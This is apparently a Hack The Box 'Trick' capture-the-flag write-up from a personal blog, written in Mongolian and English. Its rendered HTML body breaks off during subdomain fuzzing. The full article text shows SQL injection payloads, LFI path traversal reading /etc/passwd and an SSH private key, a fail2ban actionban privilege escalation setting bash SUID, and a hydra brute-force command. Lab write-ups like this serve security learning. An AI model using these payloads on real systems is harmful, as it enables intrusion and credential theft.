<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Trick | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Trick - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-15-htb-trick-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-15-htb-trick-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Trick"><meta property="og:description" content="HTB - Trick - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-15-htb-trick-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-15T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Trick"><meta name=twitter:description content="HTB - Trick - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Trick","item":"https://cadil.github.io/posts/2024-03-15-htb-trick-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Trick","name":"HTB - Trick","description":"HTB - Trick - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.166 # Local Address 10.10.14.29 2. Nmap nmap -sV -sC -oA nmap/trick 10.10.11.166 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 23:30 EDT Nmap scan report for 10.10.11.166 Host is up (0.23s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA) | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.76 seconds 3. Feroxbuster \u0026 ffuf \u0026 dig feroxbuster -u http://10.10.11.166 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.166 🚀 Threads │ 50 📖 Wordlist │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 7l 12w 185c http://10.10.11.166/js 301 7l 12w 185c http://10.10.11.166/css 301 7l 12w 185c http://10.10.11.166/assets 301 7l 12w 185c http://10.10.11.166/assets/img [####################] - 2m 149995/149995 0s found:4 errors:8 [####################] - 2m 29999/29999 193/s http://10.10.11.166 [####################] - 2m 29999/29999 194/s http://10.10.11.166/js [####################] - 2m 29999/29999 193/s http://10.10.11.166/css [####################] - 2m 29999/29999 193/s http://10.10.11.166/assets [####################] - 2m 29999/29999 193/s http://10.10.11.166/assets/img trick.htb -г etc/hosts дотор хуулах\nSubdomain шалгах: ffuf\nffuf -c -u http://trick.htb/ -H \"Host: FUZZ.trick.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5480 v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.166/ :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.10.10.11.166 :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 5480 ________________________________________________ :: Progress: [4989/4989] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:29] :: Errors: 0 :: dig\ndig axfr trick.htb @10.10.11.166 ; \u003c\u003c\u003e\u003e DiG 9.16.22-Debian \u003c\u003c\u003e\u003e axfr trick.htb @10.10.11.166 ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 228 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) ;; WHEN: Sun Jul 17 00:22:31 EDT 2022 ;; XFR size: 6 records (messages 1, bytes 231) preprod-payroll.trick.htb - subdomain 4. SQL Injection 4.1 SQL Injection POST /ajax.php?action=login HTTP/1.1 Host: preprod-payroll.trick.htb: User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 53 Origin: http://preprod-payroll.trick.htb DNT: 1 Connection: close Referer: http://preprod-payroll.trick.htb/login.php Cookie: PHPSESSID=i20dsqchbqo41pnnt04etht7bo username=admin\u0026password=admin sqlmap -r login.req --level 5 --risk 3 --threads 10 энд доор байгаа нь логин хийгдээгүй.\nsqlmap identified the following injection point(s) with a total of 733 HTTP(s) requests: --- Parameter: username (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: username=admin' OR NOT 9977=9977-- iBdY\u0026password=admin Type: error-based Title: MySQL \u003e= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: username=admin' OR (SELECT 8386 FROM(SELECT COUNT(*),CONCAT(0x71786b7071,(SELECT (ELT(8386=8386,1))),0x716b6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tdzQ\u0026password=admin Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: username=admin' AND (SELECT 1569 FROM (SELECT(SLEEP(5)))MHct)-- pTTW\u0026password=admin --- [00:47:01] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.14.2 back-end DBMS: MySQL \u003e= 5.0 (MariaDB fork) [00:47:02] [INFO] fetched data logged to text files under '/home/va4mi/.local/share/sqlmap/output/preprod-payroll.trick.htb' [00:47:02] [WARNING] your sqlmap version is outdated [*] ending @ 00:47:02 /2022-07-17/ Үүгээр логин хийсэн:\n'or 1=1 -- - # username: 'or 1=1 -- - # password: admin login хийгээд авсан creds: Administrator - Enemigosss\n4.2 PHP Filter http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:112:121::/var/lib/saned:/usr/sbin/nologincolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologinhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:118:65534::/run/sshd:/usr/sbin/nologinpostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologinbind:x:120:128::/var/cache/bind:/usr/sbin/nologinmichael:x:1001:1001::/home/michael:/bin/bash http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/etc/nginx/sites-available/default%27),4,5,6,7,8 server {\tlisten 80 default_server;\tlisten [::]:80 default_server;\tserver_name trick.htb;\troot /var/www/html;\tindex index.html index.htm index.nginx-debian.html;\tserver_name _;\tlocation / {\ttry_files $uri $uri/ =404;\t}\tlocation ~ \\.php$ {\tinclude snippets/fastcgi-php.conf;\tfastcgi_pass unix:/run/php/php7.3-fpm.sock;\t}}server {\tlisten 80;\tlisten [::]:80;\tserver_name preprod-marketing.trick.htb;\troot /var/www/market;\tindex index.php;\tlocation / {\ttry_files $uri $uri/ =404;\t} location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock; }}server { listen 80; listen [::]:80; server_name preprod-payroll.trick.htb; root /var/www/payroll; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; }} preprod-marketing.trick.htb - subdimain\n4.3 LFI http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//....//....//....//....//etc/passwd etc/passwd\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash id_rsa\nhttp://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZ********************** -----END OPENSSH PRIVATE KEY----- ssh login\nssh -i id_rsa michael@trick.htb user.txt\n8273f35********** 5. Privilege escalation groups\nmichael security sudo -l\nMatching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart fail2ban\nfail2ban/ firefox-esr/ fonts/ foomatic/ fstab fuse.conf fwupd/ michael@trick:~$ ls -lh /etc/fail2ban/ total 60K drwxrwx--- 2 root security 4.0K Jul 26 15:39 action.d -rw-r--r-- 1 root root 2.3K Jul 26 15:39 fail2ban.conf drwxr-xr-x 2 root root 4.0K Jul 26 15:39 fail2ban.d drwxr-xr-x 3 root root 4.0K Jul 26 15:39 filter.d -rw-r--r-- 1 root root 23K Jul 26 15:39 jail.conf drwxr-xr-x 2 root root 4.0K Jul 26 15:39 jail.d -rw-r--r-- 1 root root 645 Jul 26 15:39 paths-arch.conf -rw-r--r-- 1 root root 2.8K Jul 26 15:39 paths-common.conf -rw-r--r-- 1 root root 573 Jul 26 15:39 paths-debian.conf -rw-r--r-- 1 root root 738 Jul 26 15:39 paths-opensuse.conf drwxrwx--- 2 root security 4.0K Jul 26 15:39 action.d\niptables-multiport.conf -г tmp руу хуулаад өөрчлөлт оруулах\ncp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/ cd tmp vi iptables-multiport.conf # өөрчлөх actionban # actionban = chmod +s /bin/bash rm -f /etc/fail2ban/action.d/iptables-multiport.conf cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf sudo /etc/init.d/fail2ban restart hydra\n# local vm hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166 # machine vm michael@trick:/tmp$ ls -l /bin/bash -rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bash /bin/bash -p\nbash-5.0# whoami root root.txt\n4dba7ffb***** ","wordCount":"1095","inLanguage":"mn","datePublished":"2024-03-15T00:00:00Z","dateModified":"2024-03-15T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-15-htb-trick-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://cadil.github.io/using/ title=Using><span>Using</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Trick</h1><div class=post-description>HTB - Trick - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-15 00:00:00 +0000 UTC'>гуравдугаар сар 15, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-feroxbuster--ffuf--dig aria-label="3. Feroxbuster & ffuf & dig">3. Feroxbuster & ffuf & dig</a></li><li><a href=#4-sql-injection aria-label="4. SQL Injection">4. SQL Injection</a><ul><li><a href=#41-sql-injection aria-label="4.1 SQL Injection">4.1 SQL Injection</a></li><li><a href=#42-php-filter aria-label="4.2 PHP Filter">4.2 PHP Filter</a></li><li><a href=#43-lfi aria-label="4.3 LFI">4.3 LFI</a></li></ul></li><li><a href=#5-privilege-escalation aria-label="5. Privilege escalation">5. Privilege escalation</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.166
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.29
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/trick 10.10.11.166
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-07-16 23:30 EDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.166
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.23s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>996</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>25/tcp open  smtp    Postfix smtpd
</span></span><span style=display:flex><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
</span></span><span style=display:flex><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span style=color:#f92672>(</span>Debian Linux<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| dns-nsid: 
</span></span><span style=display:flex><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.14.2
</span></span><span style=display:flex><span>|_http-title: Coming Soon - Start Bootstrap Theme
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.14.2
</span></span><span style=display:flex><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 79.76 seconds
</span></span></code></pre></div><h3 id=3-feroxbuster--ffuf--dig>3. Feroxbuster & ffuf & dig<a hidden class=anchor aria-hidden=true href=#3-feroxbuster--ffuf--dig>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>feroxbuster -u http://10.10.11.166 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>───────────────────────────┬──────────────────────
</span></span><span style=display:flex><span> 🎯  Target Url            │ http://10.10.11.166
</span></span><span style=display:flex><span> 🚀  Threads               │ <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span style=display:flex><span> 👌  Status Codes          │ <span style=color:#f92672>[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> 💥  Timeout <span style=color:#f92672>(</span>secs<span style=color:#f92672>)</span>        │ <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span> 🦡  User-Agent            │ feroxbuster/2.3.3
</span></span><span style=display:flex><span> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
</span></span><span style=display:flex><span> 🔃  Recursion Depth       │ <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
</span></span><span style=display:flex><span>───────────────────────────┴──────────────────────
</span></span><span style=display:flex><span> 🏁  Press <span style=color:#f92672>[</span>ENTER<span style=color:#f92672>]</span> to use the Scan Cancel Menu™
</span></span><span style=display:flex><span>──────────────────────────────────────────────────
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       12w      185c http://10.10.11.166/js
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       12w      185c http://10.10.11.166/css
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       12w      185c http://10.10.11.166/assets
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       12w      185c http://10.10.11.166/assets/img
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m    149995/149995  0s      found:4       errors:8      </span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   193/s   http://10.10.11.166</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   194/s   http://10.10.11.166/js</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   193/s   http://10.10.11.166/css</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   193/s   http://10.10.11.166/assets</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   193/s   http://10.10.11.166/assets/img</span>
</span></span></code></pre></div><p>trick.htb -г etc/hosts дотор хуулах</p><p>Subdomain шалгах:
ffuf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -c -u http://trick.htb/ -H <span style=color:#e6db74>&#34;Host: FUZZ.trick.htb&#34;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs <span style=color:#ae81ff>5480</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>       v1.3.1 Kali Exclusive &lt;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://10.10.11.166/
